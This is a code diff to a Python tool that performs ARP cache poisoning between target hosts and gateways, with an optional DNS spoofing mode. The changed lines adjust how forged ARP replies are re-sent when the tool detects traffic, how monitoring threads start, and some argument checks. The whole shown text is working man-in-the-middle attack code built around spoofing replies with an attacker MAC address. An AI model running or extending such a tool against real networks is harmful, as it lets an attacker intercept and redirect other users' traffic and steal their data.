@@ -120,7 +120,7 @@ def arp_poison(targets, gateways):
 
             # print("[*] end of ARP storm...") if options.verbose else 0
             if(options.silent and i >=2):
-                print("[*] Initial poison complete")
+                print("[*] Poison complete")
                 return
 
         except Exception as e:
@@ -139,15 +139,15 @@ def poison_confirm(targets, gateways):
                 if(pkt[ARP].psrc == target.ip):
                     for gateway in gateways:
                         if(pkt[ARP].pdst == gateway.ip):
-                            arpReply = forge_arp(gateway.ip, target.ip, target.mac, ATTACKER_MAC, 2)
-                            sendp(arpReply, iface=options.iface, verbose=False)
-                            print("ARP broadcast from " + arpReply[ARP].psrc + " to " + arpReply[ARP].pdst)
+                            arp_poison(targets, gateways)
+                            print("ARP broadcast from " + pkt[ARP].psrc + " to " + pkt[ARP].pdst)
                 if(not options.oneway):
                     if(pkt[ARP].pdst == target.ip):
                         for gateway in gateways:
                             if(pkt[ARP].psrc == gateway.ip):
-                                arpReply = forge_arp(target.ip, gateway.ip, gateway.mac, ATTACKER_MAC, 2)
-                                sendp(arpReply, iface=options.iface, verbose=False)
+                                arp_poison(targets, gateways)
+                                print("ARP broadcast from " + pkt[ARP].psrc + " to " + pkt[ARP].pdst)
+
 
         # print("[*] Received ARP packet:")
         # pkt.show()
@@ -175,7 +175,7 @@ def main():
             sys.exit(0)
         targets.append(type('obj', (object,), {"mac": target_mac, "ip": target}))
 
-    if options.gateways.__len__() > 0:
+    if options.gateways is not None:
         for gatewayAdr in options.gateways:
             gateway = format(gatewayAdr)
             gateway_mac = get_mac(gateway)
@@ -206,7 +206,8 @@ def main():
 
     #use daemon=True to run in background and stop when application quits
     threading.Thread(target=arp_poison, args=(targets, gateways), daemon=True).start()
-    threading.Thread(target=poison_confirm, args=(targets, gateways), daemon=True).start()
+    if(options.silent):
+        threading.Thread(target=poison_confirm, args=(targets, gateways), daemon=True).start()
 
     time.sleep(ARP_POISON_WARM_UP)
 
@@ -215,7 +216,7 @@ def main():
 
     if options.dns_spoof:
         print("[*] Starting DNS spoofing thread...")
-        if(options.urls.__len__() < 2):
+        if(len(options.urls) < 2):
             print("[!] Error: You need to specify at least 1 URL and 1 IP")
             sys.exit(0)
 
